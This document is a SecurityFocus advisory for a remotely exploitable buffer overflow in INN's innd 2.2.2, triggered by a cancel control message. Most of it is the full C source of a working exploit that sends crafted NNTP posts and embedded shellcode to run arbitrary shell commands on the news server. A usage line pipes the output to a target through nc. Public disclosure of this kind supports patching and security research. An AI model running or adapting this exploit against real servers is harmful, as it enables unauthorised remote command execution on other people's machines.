source: http://www.securityfocus.com/bid/1316/info

innd 2.2.2 contains a remotely exploitable buffer overflow in code reached when a cancel request is sent to the "control" newsgroup, under the following condition: the cancel request contains a valid Message-ID but the From/Sender fields differ between the cancel request and the post referenced by the Message-ID. This attack only works against machines running INN with "verifycancels = true" 

/*
 * inndx: innd remote 'news' user/group exploit
 *
 * Written on 12th June 2000 by Wojciech Purczynski
 * <wp@elzabsoft.pl> cliph/ircnet 
 *
 * Bug found by Michal Zalewski.
 *
 * Tested on innd-2.2.2-3 default installation on RedHat 6.2.
 *
 * Usage:
 * ./inndx [command [offset]]|nc -i 1 target.host 119
 */

#include <stdio.h>
#include <unistd.h>

#define RETADDR 0x8138004 /* we're jumping into the body of cancel msg */
#define BUFSIZE (256+2*4+4) /* buff + EBP + EIP + Data */
#define JUNKSIZE strlen("\"\" wants to cancel <> by \"")
#define NOP 0x90
#define FAKEPTR 0xbffff1c0
#define COMMAND "echo U have b33n h@x0r3d hahahah|mail root"
#define BODYSIZE 999

/* Code written by me */
char * run_command=
	"\xeb\x3d\x5e\x89\xf7\x31\xc0\x47"
	"\x80\x3f\xff\x75\xfa\x88\x07\x47"
	"\x89\x37\x89\xf3\x46\x80\x3e\x2e"
	"\x75\xfa\x88\x06\x46\x89\x77\x04"
	"\x46\x80\x3e\x2e\x75\xfa\x88\x06"
	"\x46\x89\x77\x08\x89\x47\x0c\x89"
	"\xf9\x8d\x57\x0c\xb0\x0b\xcd\x80"
	"\x89\xc3\x31\xc0\x40\xcd\x80\xe8"
	"\xbe\xff\xff\xff/bin/sh.-c.";

int main(int argc, char *argv[])
{
	int retaddr=RETADDR;
	char messageid[256];
	char sender[16];
	char body[BODYSIZE];
	char * command=COMMAND;
	int midsize;
	int i;

	if (argc>1) command=argv[1];
	if (argc>2) retaddr+=atoi(argv[2]);

	memset(sender, 0, sizeof(sender));
	strcpy(sender+0, "a@a.");		/* EBP */
	*(long*)(sender+4)=(long)retaddr;	/* EIP */
	*(long*)(sender+8)=(long)RETADDR+1000;	/* Data */
	
	memset(messageid, 'a', sizeof(messageid));
	sprintf(messageid, "%s@a", tmpnam(NULL)+9);
	messageid[strlen(messageid)]='a';
	messageid[BUFSIZE-JUNKSIZE-5-strlen(sender)]=0;

	memset(body, NOP, sizeof(body));
	strcpy(body+sizeof(body)-strlen(run_command)-strlen(command)-2, run_command);
	strcat(body, command);
	strcat(body, "\xff");
	
	fprintf(stderr, "RETADDR=%p\n", retaddr);
	fprintf(stderr, "COMMAND=%s\n", command);
	
	printf("mode reader\r\ngroup test\r\npost\r\n");
	printf("Message-ID: <%s>\r\n", messageid);
	printf("From: %s\r\nSender: %s\r\n", sender, sender);
	printf("Newsgroups: test\r\n");
	printf("Subject: blah\r\n");
	printf("\r\nblah\r\n.\r\n");
	
	printf("group control\r\npost\r\n");
	printf("Message-ID: <%s@test>\r\n", tmpnam(NULL)+9);
	printf("From: a@b.c\r\nSender: a@b.c\r\n");
	printf("Control: cancel <%s>\r\n", messageid);
	printf("Subject: cmsg cancel <%s>\r\n", messageid);
	printf("Newsgroups: control\r\n\r\n%s\r\n.\r\nquit\r\n", body);
}

